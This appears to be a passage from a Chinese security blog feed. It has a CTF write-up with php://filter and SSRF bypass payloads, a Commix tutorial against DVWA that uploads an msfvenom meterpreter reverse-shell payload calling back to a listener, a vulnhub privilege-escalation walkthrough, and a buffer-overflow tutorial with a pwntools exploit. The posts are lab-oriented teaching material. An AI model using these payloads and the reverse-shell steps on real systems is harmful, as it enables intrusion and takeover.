<p><img src="/images/ctf_2/18.jpg" alt="18"></p>
<p>参考文章：<a href="http://www.secevery.com:4321/bugs/wooyun-2014-063895" target="_blank" rel="noopener">全局变量覆盖导致的安全问题</a></p>
<ul>
<li>死亡退出</li>
</ul>
<p>打开题目给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  $c=<span class="string">"&lt;?php exit;?&gt;"</span>;</span><br><span class="line">  @$c.=$_POST[<span class="string">'c'</span>];<span class="comment">//.=相当于+=,POST的数据$c接在<span class="meta">&lt;?php</span> exit;<span class="meta">?&gt;</span>后面。</span></span><br><span class="line">  @$filename=$_POST[<span class="string">'file'</span>]; </span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($filename))                    </span><br><span class="line">  &#123;                                       </span><br><span class="line">    file_put_contents(<span class="string">'tmp.php'</span>, <span class="string">''</span>); 将$c的内容存放到tmp.php这个文件中。</span><br><span class="line">  &#125;                                 </span><br><span class="line">  @file_put_contents($filename, $c);</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'tmp.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>阅读代码<strong>$c</strong>在开头增加了<strong>exit</strong>所以导致用户无法直接执行，即使可以将文件写入也无法执行。</p>
<p>但是<strong>$c=$_POST[‘file’]</strong>是可控协议，可以使用<strong>php://filter</strong>，使用<strong>php://filter</strong>流的<strong>base64-decode</strong></p>
<p>方法将<strong>$c</strong>编码，利用<strong>php</strong>的<strong>base_decode</strong>函数特性去除<strong>exit</strong>。</p>
<p>使用<strong>base64</strong>的解码方法时，<strong>base64</strong>的解码方法时以4个字节为一组，且会过滤一系列的特殊字符，<code>&lt;?php exit; ?&gt;</code>会被修正为<strong>phpexit</strong>这七个字符，我们只需要在写入变量<strong>c</strong>时在开头随便补充一位，在进行<strong>base64</strong>加密和解密时<strong>phpexit</strong>便会失效。</p>
<p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
<p>对<code>&lt;?php echo file_get_contents(&quot;flag.php&quot;):?&gt;</code>进行<strong>base64</strong>编码得到<code>PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==</code></p>
<p><strong>payload:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/write=convert.base64-decode/resource=tmp.php&amp;c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure>



<ul>
<li><strong>网站检测器</strong></li>
</ul>
<p>拿到题目后发现是一个检测网站功能的网页，按照提示输入网站后会将网页的内容输出到屏幕上</p>
<p><img src="/images/ctf_2/19.jpg" alt="19"></p>
<p>这里可以想到使用<strong>SSRF</strong>,一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。而这里我们可以通过<code>http://www.moctf.com/</code>访问到本地。</p>
<ul>
<li>利用<strong>URL</strong>解析问题：</li>
</ul>
<p>有时候后台会对访问的<strong>URL</strong>进行解析，然后对解析出的<strong>host</strong>地址进行过滤。这时候可通过对<strong>URL</strong>的解析不当绕过过滤。<code>http://www.moctf.com@127.0.0.1/flag.php</code>由于第一个地址后参数为@导致解析不当，当进行host地址过滤时，将会过滤掉第一个Host地址，保留第二个地址127.0.0.1让我们能够成功访问到它。</p>
<ul>
<li>对<strong>URL</strong>进行编码</li>
</ul>
<p>可以使用进制编码，例如</p>
<p><strong>127.0.0.1</strong></p>
<blockquote>
<p>二进制：01111111.00000000.00000000.00000001</p>
<p>八进制：017700000001</p>
<p>十六进制：7f000001</p>
</blockquote>
<p>还可以使用<strong>URL</strong>编码，如<strong>flag.php</strong>进行二次编码后得到</p>
<p><code>%25%36%36%25%36%43%25%36%31%25%36%37%25%32%45%25%37%30%25%36%38%25%37%30</code></p>
<p>所以<strong>payload</strong>为：<code>http%3A%2F%2Fwww.moctf.com@017700000001/%25%36%36%25%36%43%25%36%31%25%36%37%25%32%45%25%37%30%25%36%38%25%37%30</code></p>
<ul>
<li><strong>SSRF绕过方法</strong></li>
</ul>
<p>1.利用DNS解析<br>网络上存在一个神奇的服务<strong><a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io/</a></strong>当我们访问这个网站的子域名的时候会重新定向到主域名，例如<strong>192.168.0.1.xip.io</strong>，就会自动重定向到<strong>192.168.0.1。</strong></p>
<p>2.通过各种非<strong>http</strong>协议<br> <strong>GOPHER</strong>协议：通过<strong>GOPHER</strong>我们在一个<strong>URL</strong>参数中构造<strong>Post</strong>或者<strong>Get</strong>请求。<br> 例如我们可以使用GOPHER协议对与内网的<strong>Redis</strong>服务进行攻击.<br> <strong>File</strong>协议：<strong>File</strong>协议主要用于访问本地计算机中的文件<br> <strong>Request:file:///C:/Windows/win.ini</strong></p>
<p>3.<strong>DNS Rebuilding</strong><br> (1)服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP<br> (2)对于获得的IP进行判断，发现为非黑名单IP，则通过验证<br> (3)服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。<br> (4)由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Commix-Command Injection Exploiter</title>
    <url>/2019/03/24/Commix/</url>
    <content><![CDATA[<h5 id="命令注入简介："><a href="#命令注入简介：" class="headerlink" title="命令注入简介："></a>命令注入简介：</h5><p>命令注入也称shell注入或者OS注入。主机操作系统的任意命令通过易受攻击的应用程序执行，当Web应用程序将不安全的用户数据发送到系统shell时，可能会发生此类攻击。此用户数据可以是任何形式，例如表单，cookie，HTTP标头等</p>
<h5 id="Commix简介："><a href="#Commix简介：" class="headerlink" title="Commix简介："></a>Commix简介：</h5><p>Commix是自动化的用于利用Web应用程序中命令注入的漏洞，可以很容易找到与命令注入相关的漏洞，然后进一步利用。</p>
<p>Commix有各种命令选项，可以使用它们来查找目标应用程序并与之连接。</p>
<a id="more"></a>

<h5 id="Commix中的命令注入类型："><a href="#Commix中的命令注入类型：" class="headerlink" title="Commix中的命令注入类型："></a>Commix中的命令注入类型：</h5><p><font color="red"><strong>基于结果的命令注入:</strong></font></p>
<p>这种类型的注入攻击允许通过Web应用程序的结果推断注入命令的结果</p>
<ul>
<li>基于经典结果的注入：这是最常用的命令注入，也是最简单的。使用几个常见的操作符将正确的命令与注入命令链接在一起，或者完全排除初始命令，然后继续执行注入的命令，进一步分为Shellcode，ICMP exfiltration ，DNS exfiltration。</li>
<li>基于eval的技术：在目标Web应用程序易受eval()函数攻击的情况下使用此技术。该eval函数用于执行在运行时期间在所述函数中定义的特殊代码。</li>
</ul>
<p><font color="red"><strong>盲命令注入:</strong></font></p>
<p>执行注入的shell命令后检索数据的方式是俩种类型的工作之间的主要区别，在Web应用程序下不向攻击者提供任何结果的情况下没使用盲命令注入</p>
<ul>
<li>基于时间技术：延迟执行注入命令的时间。通过检查应用程序回复所花费的时间将使攻击者能够确定命令是否成功执行。</li>
<li>基于文件的技术：如果无法通过反应来确定Web应用程序的结果，则使用该方法。将允许编写要在文件中可访问的命令集。</li>
</ul>
<h5 id="在DVWA上进行测试"><a href="#在DVWA上进行测试" class="headerlink" title="在DVWA上进行测试"></a>在DVWA上进行测试</h5><p><img src="/images/commix/1.jpg" alt="1"></p>
<ul>
<li>使用Burp抓包获取到cookie</li>
</ul>
<p><img src="/images/commix/2.jpg" alt="2"></p>
<ul>
<li>使用参数<code>-cookie和-data</code>来验证会话，用这俩个参数发送数据字符串，以便利用POST方法并同时验证会话</li>
</ul>
<p>命令：<code>commix -u http://192.168.1.38/DVWA/vulnerabilities/exec/ --cookie=&quot;PHPSESSID=pine68kenlqols1k12vobglj81&quot; --data=&quot;ip=192.168.1.38&amp;Submit=Submit&quot;</code></p>
<p>会获得以下会话：</p>
<p><img src="/images/commix/3.jpg" alt="3"></p>
<ul>
<li>使用msfvenom创建恶意文件</li>
</ul>
<p><code>msfvenom -p python/meteroreter/reverse_tcp lhost=192.168.1.44 lport=1234 -f raw &gt;venom.py</code></p>
<p><img src="/images/commix/4.jpg" alt="4"></p>
<ul>
<li><p>将恶意文件上传到目标并运行</p>
<p><code>commix -u http://192.168.1.38/DVWA/vulnerabilities/exec/ cookie=&quot;PHPSESSID=pine68kenlqols1k12vobglj81&quot; --data=&quot;ip=192.168.1.38&amp;Submit=Submit&quot; --file-write=&quot;/root/venom.py&quot; --file-dest=&quot;/tmp/venom.py&quot; --os-cmd=&quot;python /tmp/venom.py&quot;</code></p>
</li>
<li><p>然后使用multi/handler来获取会话，</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/mutli/handler</span><br><span class="line">set payload python/meterpreter/reverse_tcp</span><br><span class="line">set lhost eth0</span><br><span class="line">set lport 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Tools</category>
      </categories>
  </entry>
  <entry>
    <title>unknowndevice靶机测试</title>
    <url>/2019/03/20/unknowndevice/</url>
    <content><![CDATA[<p>首先拿到该靶机，目标是获得root权限</p>
<p><img src="/images/unknowndevice/1.jpg" alt="1"></p>
<a id="more"></a>

<h5 id="第一步探测IP："><a href="#第一步探测IP：" class="headerlink" title="第一步探测IP："></a>第一步探测IP：</h5><p><img src="/images/unknowndevice/2.jpg" alt="2"></p>
<p>目标IP-&gt;192.168.2.137</p>
<h5 id="下一步使用nmap探测端口"><a href="#下一步使用nmap探测端口" class="headerlink" title="下一步使用nmap探测端口"></a>下一步使用nmap探测端口</h5><p><img src="/images/unknowndevice/3.jpg" alt="3"></p>
<p>只有俩个端口正在运行，发现31337端口正在运行HTTP服务，访问该端口</p>
<h5 id="在该页面中发现了一个字符串可能是某个密码"><a href="#在该页面中发现了一个字符串可能是某个密码" class="headerlink" title="在该页面中发现了一个字符串可能是某个密码"></a>在该页面中发现了一个字符串可能是某个密码</h5><p><img src="/images/unknowndevice/4.jpg" alt="4"></p>
<h5 id="查看源代码发现有一张图片，下载到本地，有可能使用了隐写术"><a href="#查看源代码发现有一张图片，下载到本地，有可能使用了隐写术" class="headerlink" title="查看源代码发现有一张图片，下载到本地，有可能使用了隐写术"></a>查看源代码发现有一张图片，下载到本地，有可能使用了隐写术</h5><p><img src="/images/unknowndevice/5.jpg" alt="5"></p>
<h5 id="使用steghide破解图片中隐藏的信息"><a href="#使用steghide破解图片中隐藏的信息" class="headerlink" title="使用steghide破解图片中隐藏的信息"></a>使用steghide破解图片中隐藏的信息</h5><p><code>steghide extract -sf key_is_h1dd3n.jpg</code></p>
<p>刚刚得到字符串作为密码</p>
<p><img src="/images/unknowndevice/6.jpg" alt="6"></p>
<p>解密出一串Brainfuck编码的字符串</p>
<p><img src="/images/unknowndevice/7.jpg" alt="7"></p>
<p>解码得到 <strong>ud64:1M!#64@ud</strong>，看起来像用户名和密码</p>
<h5 id="试试在1337端口上使用SSH连接"><a href="#试试在1337端口上使用SSH连接" class="headerlink" title="试试在1337端口上使用SSH连接"></a>试试在1337端口上使用SSH连接</h5><p><code>ssh ud64@192.168.2.137 -p 1337</code></p>
<p>连接上后发现这是一个受限制的shell，PATH和shell环境变量都只是只读的</p>
<p><img src="/images/unknowndevice/8.jpg" alt="8"></p>
<p>按Tab键后发现我们可以使用vim编辑器</p>
<p><img src="/images/unknowndevice/9.jpg" alt="9"></p>
<p>在vi 编辑器中可以避开受限制的shell</p>
<p><img src="/images/unknowndevice/11.jpg" alt="11"></p>
<p><img src="/images/unknowndevice/10.jpg" alt="10"></p>
<h5 id="现在我们将-bin-bash导出为SHELL环境变量，将-usr-bin导出为PATH环境变量"><a href="#现在我们将-bin-bash导出为SHELL环境变量，将-usr-bin导出为PATH环境变量" class="headerlink" title="现在我们将/bin/bash导出为SHELL环境变量，将/usr/bin导出为PATH环境变量"></a>现在我们将/bin/bash导出为SHELL环境变量，将/usr/bin导出为PATH环境变量</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=/usr/bin:$PATH</span><br><span class="line">export SHELL=/bin/bash:$SHELL</span><br></pre></td></tr></table></figure>

<p><img src="/images/unknowndevice/12.jpg" alt="12"></p>
<p>我们发现可以在没有密码的情况下以root身份运行<strong>/usr/bin/sysud64</strong></p>
<h5 id="在执行sysud64时，发现其实是在执行strace"><a href="#在执行sysud64时，发现其实是在执行strace" class="headerlink" title="在执行sysud64时，发现其实是在执行strace"></a>在执行sysud64时，发现其实是在执行strace</h5><p>可以使用sysud64以root用户的身份建立一个shell，然后切换到root目录</p>
<p><img src="/images/unknowndevice/13.jpg" alt="13"></p>
<p>得到flag</p>
<p><strong>strace命令</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通 过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</span><br></pre></td></tr></table></figure>

<p>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-c 统计每一系统调用的所执行的时间,次数和出错的次数等. </span><br><span class="line">-d 输出strace关于标准错误的调试信息. </span><br><span class="line">-f 跟踪由fork调用所产生的子进程. </span><br><span class="line">-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号. </span><br><span class="line">-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪. </span><br><span class="line">-h 输出简要的帮助信息. </span><br><span class="line">-i 输出系统调用的入口指针. </span><br><span class="line">-q 禁止输出关于脱离的消息. </span><br><span class="line">-r 打印出相对时间关于,,每一个系统调用. </span><br><span class="line">-t 在输出中的每一行前加上时间信息. </span><br><span class="line">-tt 在输出中的每一行前加上时间信息,微秒级. </span><br><span class="line">-ttt 微秒级输出,以秒了表示时间. </span><br><span class="line">-T 显示每一调用所耗的时间. </span><br><span class="line">-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出. </span><br><span class="line">-V 输出strace的版本信息. </span><br><span class="line">-x 以十六进制形式输出非标准字符串 </span><br><span class="line">-xx 所有字符串以十六进制形式输出. </span><br><span class="line">-a column </span><br><span class="line">设置返回值的输出位置.默认 为40. </span><br><span class="line">-e expr </span><br><span class="line">指定一个表达式,用来控制如何跟踪.格式如下: </span><br><span class="line">[qualifier&#x3D;][!]value1[,value2]... </span><br><span class="line">qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如: </span><br><span class="line">-eopen等价于 -e trace&#x3D;open,表示只跟踪open调用.而-etrace!&#x3D;open表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. </span><br><span class="line">注意有些shell使用!来执行历史记录里的命令,所以要使用\\. </span><br><span class="line">-e trace&#x3D;set </span><br><span class="line">只跟踪指定的系统 调用.例如:-e trace&#x3D;open,close,rean,write表示只跟踪这四个系统调用.默认的为set&#x3D;all. </span><br><span class="line">-e trace&#x3D;file </span><br><span class="line">只跟踪有关文件操作的系统调用. </span><br><span class="line">-e trace&#x3D;process </span><br><span class="line">只跟踪有关进程控制的系统调用. </span><br><span class="line">-e trace&#x3D;network </span><br><span class="line">跟踪与网络有关的所有系统调用. </span><br><span class="line">-e strace&#x3D;signal </span><br><span class="line">跟踪所有与系统信号有关的 系统调用 </span><br><span class="line">-e trace&#x3D;ipc </span><br><span class="line">跟踪所有与进程通讯有关的系统调用 </span><br><span class="line">-e abbrev&#x3D;set </span><br><span class="line">设定 strace输出的系统调用的结果集.-v 等与 abbrev&#x3D;none.默认为abbrev&#x3D;all. </span><br><span class="line">-e raw&#x3D;set </span><br><span class="line">将指 定的系统调用的参数以十六进制显示. </span><br><span class="line">-e signal&#x3D;set </span><br><span class="line">指定跟踪的系统信号.默认为all.如 signal&#x3D;!SIGIO(或者signal&#x3D;!io),表示不跟踪SIGIO信号. </span><br><span class="line">-e read&#x3D;set </span><br><span class="line">输出从指定文件中读出 的数据.例如: </span><br><span class="line">-e read&#x3D;3,5 </span><br><span class="line">-e write&#x3D;set </span><br><span class="line">输出写入到指定文件中的数据. </span><br><span class="line">-o filename </span><br><span class="line">将strace的输出写入文件filename </span><br><span class="line">-p pid </span><br><span class="line">跟踪指定的进程pid. </span><br><span class="line">-s strsize </span><br><span class="line">指定输出的字符串的最大长度.默认为32.文件名一直全部输出. </span><br><span class="line">-u username </span><br><span class="line">以username 的UID和GID执行被跟踪的命令</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶机测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Buffer overflow</title>
    <url>/2019/03/09/Buffer-overflow/</url>
    <content><![CDATA[<h4 id="0x10文件描述符简介"><a href="#0x10文件描述符简介" class="headerlink" title="0x10文件描述符简介"></a>0x10文件描述符简介</h4><blockquote>
<p>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8" target="_blank" rel="noopener">内核</a>为每一个<a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B" target="_blank" rel="noopener">进程</a>所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1" target="_blank" rel="noopener">程序设计</a>中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于<a href="https://zh.wikipedia.org/wiki/UNIX" target="_blank" rel="noopener">UNIX</a>、<a href="https://zh.wikipedia.org/wiki/Linux" target="_blank" rel="noopener">Linux</a>这样的操作系统。</p>
</blockquote>
<a id="more"></a>

<ul>
<li><strong>思想</strong></li>
</ul>
<p><code>Linux</code>很重要的设计思想就是一切皆文件，网络是文件，键盘等外设也是文件，于是所有资源都有了统一的接口，开发者可以像写文件那样通过网络传输数据。</p>
<p>内核给每个访问的文件分配了文件描述符(File Descriptor),它本质是一个非负整数，在打开或新建文件时返回，以后读写文件都要通过这个文件描述符。</p>
<ul>
<li><strong>应用</strong></li>
</ul>
<p><code>Linux</code>在实现时这个<strong>FD</strong>其实是一个索引值，指向每个进程打开文件的记录表。</p>
<p><strong>POSIX</strong>已经定义了<strong>STDIN_FILENO</strong>、<strong>STDOUT_FILENO</strong>和<strong>STDERR_FILENO</strong>三个常量，也就是<strong>0</strong>、<strong>1</strong>、<strong>2</strong>。这三个文件描述符是每个进程都有的，这也解释了为什么每个进程都有编号为<strong>0</strong>、<strong>1</strong>、<strong>2</strong>的文件而不会与其他进程冲突。</p>
<p>文件描述符帮助应用找到这个文件，而文件的打开模式等上下文信息存储在文件对象中，这个对象直接与文件描述符关联。</p>
<p>即意味着</p>
<ol>
<li>每个文件描述符会与一个打开的文件相对应</li>
<li>不同的文件描述符也可指向同一个文件</li>
<li>相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开</li>
</ol>
<h4 id="0x20栈溢出"><a href="#0x20栈溢出" class="headerlink" title="0x20栈溢出"></a>0x20栈溢出</h4><p>计算机程序的运行依赖于函数调用栈。栈溢出是指在栈内写入超出长度限制的数据，从而破坏程序运行甚至获得系统控制权的攻击手段。</p>
<p>为了实现栈溢出，要满足俩个条件。</p>
<blockquote>
<p><strong>程序要有向栈内写入数据的行为</strong></p>
<p><strong>程序并不限制写入数据的长度</strong></p>
</blockquote>
<ul>
<li><strong>函数调用栈</strong></li>
</ul>
<p>函数调用栈是指程序运行时内存的一段连续的区域，用来保存函数运行时的状态信息。包括<strong>函数参数与局部变量等</strong>。发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶；在函数调用结束后，栈顶的函数状态被弹出，栈顶恢复到调用函数的状态。<strong>即每次调用一个函数时，栈就会增长；从一个函数返回时，栈就会收缩。</strong>函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p>
<ul>
<li><strong>函数调用发生和结束时调用栈的关系</strong></li>
</ul>
<p>函数状态主要涉及三个寄存器－－<font color="red"><strong>esp，ebp，eip。</strong></font><strong>esp 用来存储函数调用栈的栈顶地址</strong>，在压栈和退栈时发生变化。<strong>ebp 用来存储当前函数状态的基地址</strong>，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<strong>eip 用来存储即将执行的程序指令的地址</strong>，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
<ul>
<li><strong>栈溢出攻击</strong></li>
</ul>
<p>当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是<strong>eip</strong>，所以我们的目标就是<strong>让eip载入攻击指令的地址。</strong></p>
<p>在退栈过程中，返回地址会被传给 <strong>eip</strong>，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。</p>
<p><img src="/images/Buffer/pic.jpg" alt="pic"></p>
<ul>
<li><font color="red"><strong>核心目的是用攻击指令的地址来覆盖返回地址</strong></font></li>
</ul>
<p>在函数调用发生时，<strong>eip</strong>会指向源程序中的某个指定的函数，没有办法通过改写返回地址来控制，但是可以将原本指定的函数在调用时替换为其他函数。</p>
<h4 id="0x30栈溢出练习"><a href="#0x30栈溢出练习" class="headerlink" title="0x30栈溢出练习"></a>0x30栈溢出练习</h4><h5 id="–通过栈溢出，使函数返回程序中的system-函数"><a href="#–通过栈溢出，使函数返回程序中的system-函数" class="headerlink" title="–通过栈溢出，使函数返回程序中的system()函数"></a><strong>–通过栈溢出，使函数返回程序中的<code>system()</code>函数</strong></h5><p><strong>Code:</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,s,<span class="number">128</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vul();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>因为数组长度为20，但是<code>read()</code>函数读取128字节，所以存在缓冲区溢出</p>
<p>如果利用输入的字符覆盖返回地址之前的内存，可以将恶意代码的地址覆盖到返回地址，可以执行恶意代码,利用<code>gdb</code>调试程序找到<strong>基地址与返回地址</strong>，相减可以得到需要覆盖掉的字符数.</p>
<p>编译：<code>gcc -m32 vul.c -o vul -fno-stack-protector -no-pie</code>需要关闭栈溢出保护且PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。</p>
<p><img src="/images/Buffer/11.png" alt="11"></p>
<p>同理可以找到返回地址：</p>
<p><img src="/images/Buffer/2.png" alt="2"></p>
<p>相减就可以得到需要覆盖的字符数：</p>
<p><img src="/images/Buffer/3.png" alt="3"></p>
<p>将返回地址修改为<strong>system()</strong>函数的地址<a href="https://blog.csdn.net/favory/article/details/4441361" target="_blank" rel="noopener">(了解大端存储与小端存储)</a></p>
<p><strong>payload：</strong><code>padding+address of ret</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./vul'</span>)</span><br><span class="line"><span class="comment">#io=remote('192.168.233.23',10001)  对远程利用</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+<span class="string">'\x72\x91\x04\x08'</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>然后执行python脚本，反弹shell执行命令</p>
<p><img src="/images/Buffer/4.png" alt="4"></p>
<h5 id="–修改某个被调用函数的地址，让其指向另一个函数（hijack-GOT）"><a href="#–修改某个被调用函数的地址，让其指向另一个函数（hijack-GOT）" class="headerlink" title="–修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）"></a><strong>–修改某个被调用函数的地址，让其指向另一个函数</strong>（<strong>hijack GOT</strong>）</h5><ul>
<li><strong>PLT表和GOT表</strong></li>
</ul>
<p>程序对外部函数的调用需要在生成可执行文件时将外部函数链接到程序中，链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码，动态链接得到的可执行文件并不包含外部函数的代码，而是在运行时将动态链接库（若干外部函数的集合）加载到内存的某个位置，再在发生调用时去链接库定位所需的函数。</p>
<p>程序在链接库内定位到所需函数时，这个过程需要用到两张表–<strong>PLT和GOT</strong>。<strong>GOT表（全局偏移表Global Offset Table），用来储存外部很熟在内存的确切地址。</strong>GOT存储在<font color="red"><strong>数据段(Data Segment)</strong></font>，可以在程序运行中被修改。<strong>PLT表（程序链接表Procedure Linkage Table）</strong>，用来存储外部很熟的入口点<strong>（entry）</strong>，即程序到<strong>PLT</strong>这里寻找外部函数的地址。PLT存储在<font color="red"><strong>代码段(Code Segment)</strong></font>内，在运行之前就已经确定且不会被修改，所以b不会知道程序运行时动态链接库被加载的确切位置。那么<strong>PLT</strong>表内存储的入口点是<strong>GOT</strong>表中对应条目的地址。</p>
<p><img src="/images/Buffer/6.png" alt="6"></p>
<p>外部函数的内存地址存储在 <strong>GOT</strong> 而非 <strong>PLT</strong> 表内，<strong>PLT</strong> 存储的入口点又指向 <strong>GOT</strong> 的对应条目。</p>
<p><strong>GOT</strong> 表的初始值都指向 <strong>PLT</strong> 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 <strong>PLT</strong> 表内寻找对应的入口点，跳转到 <strong>GOT</strong> 表中。如果这是第一次调用这个函数，程序会通过 <strong>GOT</strong> 表再次跳转回 <strong>PLT</strong> 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 <strong>GOT</strong> 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 <strong>PLT</strong> 表跳转到 <strong>GOT</strong> 表，此时 <strong>GOT</strong> 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
<p><strong>第一次调用函数时解析函数地址并存入GOT表</strong></p>
<p><img src="/images/Buffer/7.png" alt="7"></p>
<p><strong>再次调用函数时直接读取GOT内的地址</strong></p>
<p><img src="/images/Buffer/8.png" alt="8"></p>
<p>如果实现函数的伪装，那就是到 <strong>GOT</strong> 表中将函数 A 的地址修改为函数 B 的地址。这样在后面所有对函数 A 的调用都会执行函数 B。</p>
<p>即确定函数 A 在 GOT 表中的条目位置，确定函数 B 在内存中的地址，将函数 B 的地址写入函数 A 在 GOT 表中的条目。</p>
<p><strong>Code:</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,s,<span class="number">128</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vul();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>payload：</strong><code>padding+address of read_plt+address of read_plt+parameter of read(0,address of read_got,4)</code></p>
<p><img src="/images/Buffer/9.png" alt="9"></p>
